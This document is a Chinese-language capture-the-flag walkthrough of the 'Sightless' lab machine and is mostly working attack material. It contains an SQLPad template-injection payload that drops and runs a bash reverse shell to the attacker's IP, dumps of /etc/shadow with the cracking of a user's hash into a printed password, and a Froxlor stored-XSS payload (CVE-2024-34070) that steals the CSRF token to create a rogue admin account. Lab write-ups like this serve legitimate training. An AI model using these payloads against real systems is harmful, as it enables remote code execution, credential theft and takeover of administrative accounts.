## Sightless

#### SQLPad 应用程序在 Sightlight 上以哪个系统用户身份运行？root
```
[★]$ nmap -sC -sV 10.129.231.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-03 02:44 CDT
Nmap scan report for sightless.htb (10.129.231.103)
Host is up (0.010s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.231.103]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Sightless.htb
```

```
{{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.71/4455 0>&1" > /tmp/exploit.sh') }}
```


```
$ nc -lvnp 4455
```
在浏览器Database发送：
```
{{ process.mainModule.require('child_process').exec('echo "#!/bin/bash\nbash -i
>& /dev/tcp/10.10.14.21/4455 0>&1" > /tmp/exploit.sh') }}

{{ process.mainModule.require('child_process').exec('/bin/bash /tmp/exploit.sh')
}}
```
```
[★]$ nc -lvnp 4455
listening on [any] 4455 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.243.28] 56304
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# whoami | id
whoami | id
uid=0(root) gid=0(root) groups=0(root)
root@c184118df0a6:/var/lib/sqlpad# ls -la
ls -la
total 200
drwxr-xr-x 4 root root   4096 Sep  3 13:40 .
drwxr-xr-x 1 root root   4096 Mar 12  2022 ..
drwxr-xr-x 2 root root   4096 Aug  9  2024 cache
drwxr-xr-x 2 root root   4096 Aug  9  2024 sessions
-rw-r--r-- 1 root root 188416 Sep  3 13:40 sqlpad.sqlite

root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
<SNIP>
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root@c184118df0a6:/var/lib/sqlpad#

root@c184118df0a6:/var/lib/sqlpad# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
<SNIP>
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```
```
root@c184118df0a6:/var/lib/sqlpad# grep '^michael:' /etc/passwd > passwd_michael
<lpad# grep '^michael:' /etc/passwd > passwd_michael
root@c184118df0a6:/var/lib/sqlpad# grep '^michael:' /etc/shadow > shadow_michael
<lpad# grep '^michael:' /etc/shadow > shadow_michael
root@c184118df0a6:/var/lib/sqlpad# ls -la
ls -la
total 208
drwxr-xr-x 4 root root   4096 Sep  3 13:53 .
drwxr-xr-x 1 root root   4096 Mar 12  2022 ..
drwxr-xr-x 2 root root   4096 Aug  9  2024 cache
-rw-r--r-- 1 root root     45 Sep  3 13:52 passwd_michael
drwxr-xr-x 2 root root   4096 Aug  9  2024 sessions
-rw-r--r-- 1 root root    134 Sep  3 13:53 shadow_michael
-rw-r--r-- 1 root root 188416 Sep  3 13:50 sqlpad.sqlite
root@c184118df0a6:/var/lib/sqlpad# cat passwd_michael
cat passwd_michael
michael:x:1001:1001::/home/michael:/bin/bash
root@c184118df0a6:/var/lib/sqlpad# cat shadow_michael
cat shadow_michael
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```
#### 将合并Passwd_michael和shadow_michael，从 passwd 文件拿到用户名和 UID 等信息；从 shadow 文件拿到用户名和密码哈希。
```
[★]$ vi passwd_michael
┌─[us-dedivip-1]─[10.10.14.71]─[syareya55@htb-tpkybyu0pr]─[~/Sightless]
└──╼ [★]$ vi shadow_michael
┌─[us-dedivip-1]─[10.10.14.71]─[syareya55@htb-tpkybyu0pr]─[~/Sightless]
└──╼ [★]$ cat passwd_michael shadow_michael
michael:x:1001:1001::/home/michael:/bin/bash
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::

[★]$ sudo apt install john -y
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ unshadow passwd_michael shadow_michael > michael_unshadowed
Created directory: /home/syareya55/.john
[★]$ ls
michael_unshadowed  passwd_michael  rockyou.txt  shadow_michael
[★]$ cat michael_unshadowed
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:1001:1001::/home/michael:/bin/bash

[★]$ john --wordlist=rockyou.txt michael_unshadowed
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
insaneclownposse (michael)     
1g 0:00:00:08 DONE (2025-09-03 09:26) 0.1146g/s 6752p/s 6752c/s 6752C/s kruimel..bluedolphin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
#### 密码为insaneclownposse
```
[★]$ ssh michael@10.129.243.28
The authenticity of host '10.129.243.28 (10.129.243.28)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.243.28' (ED25519) to the list of known hosts.
michael@10.129.243.28's password: 
Last login: Tue Sep  3 11:52:02 2024 from 10.10.14.23

michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)
michael@sightless:~$ cat user.txt
```
#### 然后，可以继续使用netstat检查系统上存在的开放端口命令
```
michael@sightless:~$ netstat -lputu
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:36193         0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:34175         0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:57023         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 [::]:ftp                [::]:*                  LISTEN      -                   
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -                   
udp        0      0 localhost:domain        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:bootpc          0.0.0.0:*

michael@sightless:~$ netstat -lputn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34761         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41447         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:59967         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
michael@sightless:~$
```
#### 这里我们看到端口http是打开的。我们可以使用SSH对其进行端口转发
```
[★]$ ssh michael@sightless.htb -L 10.10.14.80:8083:127.0.0.1:8080  

michael@sightless.htb's password: 

michael@sightless:~$
```
#### 神奇，竟然还有个输入端口
图
#### 在访问端口时，我们会看到一个Froxlor登录页面，这是一个轻量级服务器管理软件
#### https://nvd.nist.gov/vuln/detail/CVE-2024-34070
### 在拦截burpsuite流量时，Froxlor登录的用户和密码随意
Froxlor 是一款开源服务器管理软件。在 ​​2.1.9 之前的版本中，Froxlor 应用程序的“登录失败尝试日志记录”功能中发现了一个存储盲跨站脚本 (XSS) 漏洞。未经身份验证的用户可以在登录尝试时向 loginname 参数注入恶意脚本，这些脚本会在管理员查看系统日志时执行。

#### 鄙人输入了8282:127.0.0.1:8080 ,在使用burpsuite的时候，自找苦吃
#### 梅开二度，即使8081:127.0.0.1:8080；在 Burp 里设置的 Redirect 127.0.0.1:8081 只有在浏览器流量进入 Burp 时才会生效，现在流量根本没进入 Burp → Redirect 根本没用
图
#### 使用本机地址+端口在burpuite截取转发端口的流量，即8081:127.0.0.1:8080换成10.10.14.80:8083:127.0.0.1:8080,burpsuite也不要设置Redirect端口了。
图


#### https://github.com/advisories/GHSA-x525-54hf-xr53点击payload.txt是如下的内容：
```
admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"https%3a//demo.froxlor.org/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}
```
#### https://gchq.github.io/CyberChef/
#### 修改htttps://admin.sightless.htb:8080
```
admin{{$emit.constructor`function b(){var metaTag=document.querySelector('meta[name="csrf-token"]');var csrfToken=metaTag.getAttribute('content');var xhr=new XMLHttpRequest();var url="https://admin.sightless.htb:8080/admin_admins.php";var params="new_loginname=abcd&admin_password=Abcd@@1234&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abcd&email=yldrmtest@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token="+csrfToken+"&page=admins&action=add&send=send";xhr.open("POST",url,true);xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");alert("Your Froxlor Application has been completely Hacked");xhr.send(params)};a=b()`()}}
```

